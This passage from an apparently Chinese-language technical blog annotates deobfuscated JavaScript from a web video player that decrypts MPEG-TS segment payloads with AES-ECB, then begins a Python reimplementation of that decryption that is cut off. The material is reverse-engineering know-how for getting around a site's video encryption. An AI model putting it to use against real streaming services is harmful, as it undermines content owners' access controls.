class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  真实的解密函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">l</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> r = (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">valueOf</span>()</span><br><span class="line">            , i = <span class="keyword">new</span> d.<span class="property">ModeOfOperation</span>.<span class="title function_">ecb</span>(e)  <span class="comment">// 创建了一个 AES-ECB 函数</span></span><br><span class="line">            , n = t;</span><br><span class="line">        <span class="keyword">if</span> (t.<span class="property">length</span> % <span class="number">16</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="number">16</span> * <span class="built_in">parseInt</span>(t.<span class="property">length</span> / <span class="number">16</span>);  <span class="comment">// 去掉余数</span></span><br><span class="line">            n = n.<span class="title function_">slice</span>(<span class="number">0</span>, a),</span><br><span class="line">            n = i.<span class="title function_">decrypt</span>(n),  <span class="comment">// 每 16B 解密一次</span></span><br><span class="line">            t.<span class="title function_">set</span>(n, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">var</span> o = (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">valueOf</span>();</span><br><span class="line">            <span class="keyword">return</span> h.<span class="property">b</span>.<span class="title function_">log</span>(<span class="string">&quot;parse pes extra time:&quot;</span> + (o - r)),</span><br><span class="line">            t</span><br><span class="line">        &#125;</span><br><span class="line">        n = t,</span><br><span class="line">        n = i.<span class="title function_">decrypt</span>(t);  <span class="comment">// </span></span><br><span class="line">        <span class="keyword">var</span> o = (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">valueOf</span>();</span><br><span class="line">        <span class="keyword">return</span> h.<span class="property">b</span>.<span class="title function_">log</span>(<span class="string">&quot;parse pes extra time:&quot;</span> + (o - r)),</span><br><span class="line">        n</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    t.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">_parsePAT</span> = <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">31</span> &amp; t[e + <span class="number">10</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">11</span>]   <span class="comment">// 返回 PMT 的 PID</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    t.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">_parsePMT</span> = <span class="keyword">function</span>(<span class="params">t, e, r, i</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , f = &#123;</span><br><span class="line">            <span class="attr">audio</span>: -<span class="number">1</span>,</span><br><span class="line">            <span class="attr">avc</span>: -<span class="number">1</span>,</span><br><span class="line">            <span class="attr">id3</span>: -<span class="number">1</span>,</span><br><span class="line">            <span class="attr">isAAC</span>: !<span class="number">0</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (n = (<span class="number">15</span> &amp; t[e + <span class="number">1</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">2</span>],</span><br><span class="line">        a = e + <span class="number">3</span> + n - <span class="number">4</span>,</span><br><span class="line">        o = (<span class="number">15</span> &amp; t[e + <span class="number">10</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">11</span>],</span><br><span class="line">        e += <span class="number">12</span> + o; e &lt; a; ) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (s = (<span class="number">31</span> &amp; t[e + <span class="number">1</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">2</span>],   <span class="comment">// 取出 stream id 对应的 element pid</span></span><br><span class="line">            t[e]) &#123;  <span class="comment">// 给 stream id 对应的媒体类型赋予 PID，这个 PID 将用于判断每个包中的数据类型</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">207</span>:  </span><br><span class="line">                <span class="keyword">if</span> (!i) &#123;</span><br><span class="line">                    h.<span class="property">b</span>.<span class="title function_">log</span>(<span class="string">&quot;unkown stream type:&quot;</span> + t[e]);</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">15</span>:   <span class="comment">// stream id == 0x0f 表示这是 AAC 音频</span></span><br><span class="line">                -<span class="number">1</span> === f.<span class="property">audio</span> &amp;&amp; (f.<span class="property">audio</span> = s);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">21</span>:   <span class="comment">// stream id == 0x15 表示这是 MP3 音频</span></span><br><span class="line">                -<span class="number">1</span> === f.<span class="property">id3</span> &amp;&amp; (f.<span class="property">id3</span> = s);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">219</span>:   </span><br><span class="line">                <span class="keyword">if</span> (!i) &#123;</span><br><span class="line">                    h.<span class="property">b</span>.<span class="title function_">log</span>(<span class="string">&quot;unkown stream type:&quot;</span> + t[e]);</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">27</span>:    <span class="comment">// stream id == 0x1b 表示这是 AVC 视频</span></span><br><span class="line">                -<span class="number">1</span> === f.<span class="property">avc</span> &amp;&amp; (f.<span class="property">avc</span> = s);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                r ? -<span class="number">1</span> === f.<span class="property">audio</span> &amp;&amp; (f.<span class="property">audio</span> = s,</span><br><span class="line">                f.<span class="property">isAAC</span> = !<span class="number">1</span>) : h.<span class="property">b</span>.<span class="title function_">log</span>(<span class="string">&quot;MPEG audio found, not supported in this browser for now&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">                h.<span class="property">b</span>.<span class="title function_">warn</span>(<span class="string">&quot;HEVC stream type found, not supported for now&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="attr">default</span>:</span><br><span class="line">                h.<span class="property">b</span>.<span class="title function_">log</span>(<span class="string">&quot;unkown stream type:&quot;</span> + t[e])</span><br><span class="line">            &#125;</span><br><span class="line">            e += <span class="number">5</span> + ((<span class="number">15</span> &amp; t[e + <span class="number">3</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">4</span>])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    t.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">_parsePES</span> = <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="number">0</span></span><br><span class="line">            , r = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , f = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , c = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , u = t.<span class="property">data</span>;</span><br><span class="line">        <span class="keyword">if</span> (!t || <span class="number">0</span> === t.<span class="property">size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (; u[<span class="number">0</span>].<span class="property">length</span> &lt; <span class="number">19</span> &amp;&amp; u.<span class="property">length</span> &gt; <span class="number">1</span>; ) &#123;  <span class="comment">// 如果第一个包中的数据不够一个 PES header </span></span><br><span class="line">            <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(u[<span class="number">0</span>].<span class="property">length</span> + u[<span class="number">1</span>].<span class="property">length</span>);</span><br><span class="line">            d.<span class="title function_">set</span>(u[<span class="number">0</span>]),</span><br><span class="line">            d.<span class="title function_">set</span>(u[<span class="number">1</span>], u[<span class="number">0</span>].<span class="property">length</span>),  <span class="comment">// 合并两个包</span></span><br><span class="line">            u[<span class="number">0</span>] = d,</span><br><span class="line">            u.<span class="title function_">splice</span>(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (r = u[<span class="number">0</span>],</span><br><span class="line">        <span class="number">1</span> === (r[<span class="number">0</span>] &lt;&lt; <span class="number">16</span>) + (r[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + r[<span class="number">2</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((n = (r[<span class="number">4</span>] &lt;&lt; <span class="number">8</span>) + r[<span class="number">5</span>]) &amp;&amp; n &gt; t.<span class="property">size</span> - <span class="number">6</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            i = r[<span class="number">7</span>],   <span class="comment">// 下面几行是一些时间戳操作，与 decode 有关，忽略</span></span><br><span class="line">            <span class="number">192</span> &amp; i &amp;&amp; (s = <span class="number">536870912</span> * (<span class="number">14</span> &amp; r[<span class="number">9</span>]) + <span class="number">4194304</span> * (<span class="number">255</span> &amp; r[<span class="number">10</span>]) + <span class="number">16384</span> * (<span class="number">254</span> &amp; r[<span class="number">11</span>]) + <span class="number">128</span> * (<span class="number">255</span> &amp; r[<span class="number">12</span>]) + (<span class="number">254</span> &amp; r[<span class="number">13</span>]) / <span class="number">2</span>,</span><br><span class="line">            s &gt; <span class="number">4294967295</span> &amp;&amp; (s -= <span class="number">8589934592</span>),</span><br><span class="line">            <span class="number">64</span> &amp; i ? (f = <span class="number">536870912</span> * (<span class="number">14</span> &amp; r[<span class="number">14</span>]) + <span class="number">4194304</span> * (<span class="number">255</span> &amp; r[<span class="number">15</span>]) + <span class="number">16384</span> * (<span class="number">254</span> &amp; r[<span class="number">16</span>]) + <span class="number">128</span> * (<span class="number">255</span> &amp; r[<span class="number">17</span>]) + (<span class="number">254</span> &amp; r[<span class="number">18</span>]) / <span class="number">2</span>,</span><br><span class="line">            f &gt; <span class="number">4294967295</span> &amp;&amp; (f -= <span class="number">8589934592</span>),</span><br><span class="line">            s - f &gt; <span class="number">54e5</span> &amp;&amp; (h.<span class="property">b</span>.<span class="title function_">warn</span>(<span class="title class_">Math</span>.<span class="title function_">round</span>((s - f) / <span class="number">9e4</span>) + <span class="string">&quot;s delta between PTS and DTS, align them&quot;</span>),</span><br><span class="line">            s = f)) : f = s),</span><br><span class="line">            a = r[<span class="number">8</span>],   <span class="comment">// 取得 PES header 中循环部分的长度</span></span><br><span class="line">            c = a + <span class="number">9</span>,   <span class="comment">// 加上 pes header 长度</span></span><br><span class="line">            t.<span class="property">size</span> -= c,</span><br><span class="line">            o = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(t.<span class="property">size</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> b = <span class="number">0</span>, g = u.<span class="property">length</span>; b &lt; g; b++) &#123;</span><br><span class="line">                    r = u[b];</span><br><span class="line">                    <span class="keyword">var</span> v = r.<span class="property">byteLength</span>;</span><br><span class="line">                    <span class="keyword">if</span> (c) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (c &gt; v) &#123;</span><br><span class="line">                            c -= v;</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        r = r.<span class="title function_">subarray</span>(c),   <span class="comment">// 取得从 c 开始的子 array</span></span><br><span class="line">                        v -= c,</span><br><span class="line">                        c = <span class="number">0</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    o.<span class="title function_">set</span>(r, e),  <span class="comment">// 把这个子 array 放在 o 里面，这就是要进行解密的内容 了</span></span><br><span class="line">                    e += v</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(t)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> n &amp;&amp; (n -= a + <span class="number">3</span>),</span><br><span class="line">            p &amp;&amp; l &amp;&amp; (o = <span class="title function_">l</span>(o, p)),   <span class="comment">// 调用函数 l() 进行 AES 解密操作</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">data</span>: o,</span><br><span class="line">                <span class="attr">pts</span>: s,</span><br><span class="line">                <span class="attr">dts</span>: f,</span><br><span class="line">                <span class="attr">len</span>: n</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对整个 ts 文件的处理函数</span></span><br><span class="line">    t.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">append</span> = <span class="keyword">function</span>(<span class="params">e, r, i, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , o = e.<span class="property">length</span></span><br><span class="line">            , f = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , c = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , d = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">            , p = !<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">contiguous</span> = i;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="variable language_">this</span>.<span class="property">pmtParsed</span></span><br><span class="line">            , g = <span class="variable language_">this</span>.<span class="property">_avcTrack</span></span><br><span class="line">            , v = <span class="variable language_">this</span>.<span class="property">_audioTrack</span></span><br><span class="line">            , y = <span class="variable language_">this</span>.<span class="property">_id3Track</span></span><br><span class="line">            , m = g.<span class="property">pid</span></span><br><span class="line">            , _ = v.<span class="property">pid</span></span><br><span class="line">            , w = y.<span class="property">pid</span></span><br><span class="line">            , S = <span class="variable language_">this</span>.<span class="property">_pmtId</span></span><br><span class="line">            , E = g.<span class="property">pesData</span></span><br><span class="line">            , A = v.<span class="property">pesData</span></span><br><span class="line">            , T = y.<span class="property">pesData</span></span><br><span class="line">            , R = <span class="variable language_">this</span>.<span class="property">_parsePAT</span></span><br><span class="line">            , k = <span class="variable language_">this</span>.<span class="property">_parsePMT</span></span><br><span class="line">            , D = <span class="variable language_">this</span>.<span class="property">_parsePES</span></span><br><span class="line">            <span class="comment">// 下面的 parse 和 decode 有关，忽略</span></span><br><span class="line">            , I = <span class="variable language_">this</span>.<span class="property">_parseAVCPES</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)</span><br><span class="line">            , M = <span class="variable language_">this</span>.<span class="property">_parseAACPES</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)</span><br><span class="line">            , x = <span class="variable language_">this</span>.<span class="property">_parseMPEGPES</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)</span><br><span class="line">            , L = <span class="variable language_">this</span>.<span class="property">_parseID3PES</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)</span><br><span class="line">            , O = t.<span class="title function_">_syncOffset</span>(e);</span><br><span class="line">        <span class="keyword">for</span> (o -= (o + O) % <span class="number">188</span>,</span><br><span class="line">        a = O; a &lt; o; a += <span class="number">188</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">71</span> === e[a]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (f = !!(<span class="number">64</span> &amp; e[a + <span class="number">1</span>]),</span><br><span class="line">                c = ((<span class="number">31</span> &amp; e[a + <span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + e[a + <span class="number">2</span>],</span><br><span class="line">                (<span class="number">48</span> &amp; e[a + <span class="number">3</span>]) &gt;&gt; <span class="number">4</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((d = a + <span class="number">5</span> + e[a + <span class="number">4</span>]) === a + <span class="number">188</span>)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                    d = a + <span class="number">4</span>;</span><br><span class="line">                <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="attr">m</span>:  <span class="comment">// AVC 解密</span></span><br><span class="line">                                            <span class="comment">// 当 payload == 0x1 的时候开始 parse PES，然后顺便解密</span></span><br><span class="line">                    f &amp;&amp; (E &amp;&amp; (l = <span class="title function_">D</span>(E)) &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== l.<span class="property">pts</span> &amp;&amp; <span class="title function_">I</span>(l, !<span class="number">1</span>),</span><br><span class="line">                    <span class="comment">// 把需要解密数据的类置为空</span></span><br><span class="line">                    E = &#123;</span><br><span class="line">                        <span class="attr">data</span>: [],</span><br><span class="line">                        <span class="attr">size</span>: <span class="number">0</span></span><br><span class="line">                    &#125;),</span><br><span class="line">                    <span class="comment">// 如果存在 解密数据类，就把 PES 数据整个放入其中，以备后面 parse 和解密</span></span><br><span class="line">                    E &amp;&amp; (E.<span class="property">data</span>.<span class="title function_">push</span>(e.<span class="title function_">subarray</span>(d, a + <span class="number">188</span>)),</span><br><span class="line">                    E.<span class="property">size</span> += a + <span class="number">188</span> - d);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="attr">_</span>:  <span class="comment">// AAC 的解密</span></span><br><span class="line">                    f &amp;&amp; (A &amp;&amp; (l = <span class="title function_">D</span>(A)) &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== l.<span class="property">pts</span> &amp;&amp; (v.<span class="property">isAAC</span> ? <span class="title function_">M</span>(l) : <span class="title function_">x</span>(l)),</span><br><span class="line">                    A = &#123;</span><br><span class="line">                        <span class="attr">data</span>: [],</span><br><span class="line">                        <span class="attr">size</span>: <span class="number">0</span></span><br><span class="line">                    &#125;),</span><br><span class="line">                    A &amp;&amp; (A.<span class="property">data</span>.<span class="title function_">push</span>(e.<span class="title function_">subarray</span>(d, a + <span class="number">188</span>)),</span><br><span class="line">                    A.<span class="property">size</span> += a + <span class="number">188</span> - d);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="attr">w</span>:</span><br><span class="line">                    f &amp;&amp; (T &amp;&amp; (l = <span class="title function_">D</span>(T)) &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== l.<span class="property">pts</span> &amp;&amp; <span class="title function_">L</span>(l),  <span class="comment">// MP3 的解密</span></span><br><span class="line">                    T = &#123;</span><br><span class="line">                        <span class="attr">data</span>: [],</span><br><span class="line">                        <span class="attr">size</span>: <span class="number">0</span></span><br><span class="line">                    &#125;),</span><br><span class="line">                    T &amp;&amp; (T.<span class="property">data</span>.<span class="title function_">push</span>(e.<span class="title function_">subarray</span>(d, a + <span class="number">188</span>)),</span><br><span class="line">                    T.<span class="property">size</span> += a + <span class="number">188</span> - d);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    f &amp;&amp; (d += e[d] + <span class="number">1</span>),</span><br><span class="line">                    S = <span class="variable language_">this</span>.<span class="property">_pmtId</span> = <span class="title function_">R</span>(e, d);   <span class="comment">// 遇到了 PAT，parse 一下</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="attr">S</span>:   <span class="comment">// 遇到了 PMT，给上面的一些操作做些清理，然后重置 AES，重新开始解密</span></span><br><span class="line">                    f &amp;&amp; (d += e[d] + <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">var</span> C = <span class="title function_">k</span>(e, d, !<span class="number">0</span> === <span class="variable language_">this</span>.<span class="property">typeSupported</span>.<span class="property">mpeg</span> || !<span class="number">0</span> === <span class="variable language_">this</span>.<span class="property">typeSupported</span>.<span class="property">mp3</span>, <span class="literal">null</span> != <span class="variable language_">this</span>.<span class="property">sampleAes</span>);</span><br><span class="line">                    m = C.<span class="property">avc</span>,</span><br><span class="line">                    m &gt; <span class="number">0</span> &amp;&amp; (g.<span class="property">pid</span> = m),</span><br><span class="line">                    _ = C.<span class="property">audio</span>,</span><br><span class="line">                    _ &gt; <span class="number">0</span> &amp;&amp; (v.<span class="property">pid</span> = _,</span><br><span class="line">                    v.<span class="property">isAAC</span> = C.<span class="property">isAAC</span>),</span><br><span class="line">                    w = C.<span class="property">id3</span>,</span><br><span class="line">                    w &gt; <span class="number">0</span> &amp;&amp; (y.<span class="property">pid</span> = w),</span><br><span class="line">                    p &amp;&amp; !b &amp;&amp; (h.<span class="property">b</span>.<span class="title function_">log</span>(<span class="string">&quot;reparse from beginning&quot;</span>),</span><br><span class="line">                    p = !<span class="number">1</span>,</span><br><span class="line">                    a = O - <span class="number">188</span>),</span><br><span class="line">                    b = <span class="variable language_">this</span>.<span class="property">pmtParsed</span> = !<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8191</span>:  <span class="comment">// 处理 SDT 和 空包</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="attr">default</span>:</span><br><span class="line">                    p = !<span class="number">0</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">observer</span>.<span class="title function_">trigger</span>(s.<span class="property">a</span>.<span class="property">ERROR</span>, &#123;</span><br><span class="line">                    <span class="attr">type</span>: u.<span class="property">b</span>.<span class="property">MEDIA_ERROR</span>,</span><br><span class="line">                    <span class="attr">details</span>: u.<span class="property">a</span>.<span class="property">FRAG_PARSING_ERROR</span>,</span><br><span class="line">                    <span class="attr">fatal</span>: !<span class="number">1</span>,</span><br><span class="line">                    <span class="attr">reason</span>: <span class="string">&quot;TS packet did not start with 0x47&quot;</span></span><br><span class="line">                &#125;);</span><br><span class="line">        E &amp;&amp; (l = <span class="title function_">D</span>(E)) &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== l.<span class="property">pts</span> ? (<span class="title function_">I</span>(l, !<span class="number">0</span>),</span><br><span class="line">        g.<span class="property">pesData</span> = <span class="literal">null</span>) : g.<span class="property">pesData</span> = E,</span><br><span class="line">        A &amp;&amp; (l = <span class="title function_">D</span>(A)) &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== l.<span class="property">pts</span> ? (v.<span class="property">isAAC</span> ? <span class="title function_">M</span>(l) : <span class="title function_">x</span>(l),</span><br><span class="line">        v.<span class="property">pesData</span> = <span class="literal">null</span>) : (A &amp;&amp; A.<span class="property">size</span> &amp;&amp; h.<span class="property">b</span>.<span class="title function_">log</span>(<span class="string">&quot;last AAC PES packet truncated,might overlap between fragments&quot;</span>),</span><br><span class="line">        v.<span class="property">pesData</span> = A),</span><br><span class="line">        T &amp;&amp; (l = <span class="title function_">D</span>(T)) &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== l.<span class="property">pts</span> ? (<span class="title function_">L</span>(l),</span><br><span class="line">        y.<span class="property">pesData</span> = <span class="literal">null</span>) : y.<span class="property">pesData</span> = T,</span><br><span class="line">        <span class="literal">null</span> == <span class="variable language_">this</span>.<span class="property">sampleAes</span> ? <span class="variable language_">this</span>.<span class="property">remuxer</span>.<span class="title function_">remux</span>(v, g, y, <span class="variable language_">this</span>.<span class="property">_txtTrack</span>, r, i, n) : <span class="variable language_">this</span>.<span class="title function_">decryptAndRemux</span>(v, g, y, <span class="variable language_">this</span>.<span class="property">_txtTrack</span>, r, i, n)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="实现解密"><a href="#实现解密" class="headerlink" title="实现解密"></a>实现解密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parsepmt</span>(<span class="params">t: <span class="built_in">bytes</span>, e: <span class="built_in">int</span>, vpid, apid, mpid</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>):</span><br><span class="line">    section_length = (<span class="number">0x0f</span> &amp; t[e + <span class="number">1</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">2</span>]</span><br><span class="line">    section_body = e + <span class="number">0x03</span> + section_length - <span class="number">0x04</span></span><br><span class="line">    program_info_length = (<span class="number">0x0f</span> &amp; t[e + <span class="number">10</span>]) &lt;&lt; <span class="number">8</span> | t[e + <span class="number">11</span>]</span><br><span class="line"></span><br><span class="line">    e += <span class="number">12</span> + program_info_length</span><br><span class="line">    <span 